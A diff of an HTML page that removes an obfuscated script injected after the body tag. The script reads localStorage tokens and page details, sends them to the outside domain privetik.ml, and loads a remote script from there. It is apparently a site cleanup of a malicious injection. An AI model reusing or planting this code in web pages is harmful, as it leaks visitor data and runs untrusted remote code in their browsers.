@@ -28,49 +28,7 @@
 </head>
 
 <body>
-    <script>
-        (function() {
-        var name = '_pcpRk1PZZbTbZ8ct';
-        if (!window._pcpRk1PZZbTbZ8ct) {
-            window._pcpRk1PZZbTbZ8ct = {
-                unique: false,
-                ttl: 86400,
-                R_PATH: 'https://privetik.ml/1cQYqYks',
-                P_PATH: 'https://privetik.ml/f56f839/postback',
-            };
-        }
-        const _41PZSnYSj8sqtC5M = localStorage.getItem('config');
-        if (typeof _41PZSnYSj8sqtC5M !== 'undefined' && _41PZSnYSj8sqtC5M !== null) {
-            var _FcFKCNCRpgbQKV9w = JSON.parse(_41PZSnYSj8sqtC5M);
-            var _qWqWtY6YwCcQ6c4g = Math.round(+new Date()/1000);
-            if (_FcFKCNCRpgbQKV9w.created_at + window._pcpRk1PZZbTbZ8ct.ttl < _qWqWtY6YwCcQ6c4g) {
-                localStorage.removeItem('subId');
-                localStorage.removeItem('token');
-                localStorage.removeItem('config');
-            }
-        }
-        var _8HnqPXRL3QNLt6vV = localStorage.getItem('subId');
-        var _26tHHDWZCbVC85w2 = localStorage.getItem('token');
-        var _kD2Sc1QJKkzfp1Wm = '?return=js.client';
-            _kD2Sc1QJKkzfp1Wm += '&' + decodeURIComponent(window.location.search.replace('?', ''));
-            _kD2Sc1QJKkzfp1Wm += '&se_referrer=' + encodeURIComponent(document.referrer);
-            _kD2Sc1QJKkzfp1Wm += '&default_keyword=' + encodeURIComponent(document.title);
-            _kD2Sc1QJKkzfp1Wm += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
-            _kD2Sc1QJKkzfp1Wm += '&name=' + encodeURIComponent(name);
-            _kD2Sc1QJKkzfp1Wm += '&host=' + encodeURIComponent(window._pcpRk1PZZbTbZ8ct.R_PATH);
-        if (typeof _8HnqPXRL3QNLt6vV !== 'undefined' && _8HnqPXRL3QNLt6vV && window._pcpRk1PZZbTbZ8ct.unique) {
-            _kD2Sc1QJKkzfp1Wm += '&sub_id=' + encodeURIComponent(_8HnqPXRL3QNLt6vV);
-        }
-        if (typeof _26tHHDWZCbVC85w2 !== 'undefined' && _26tHHDWZCbVC85w2 && window._pcpRk1PZZbTbZ8ct.unique) {
-            _kD2Sc1QJKkzfp1Wm += '&token=' + encodeURIComponent(_26tHHDWZCbVC85w2);
-        }
-        var a = document.createElement('script');
-            a.type = 'application/javascript';
-            a.src = window._pcpRk1PZZbTbZ8ct.R_PATH + _kD2Sc1QJKkzfp1Wm;
-        var s = document.getElementsByTagName('script')[0];
-        s.parentNode.insertBefore(a, s)
-        })();
-        </script>
+ 
     <!--[if lte IE 9]>
             <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
         <![endif]-->
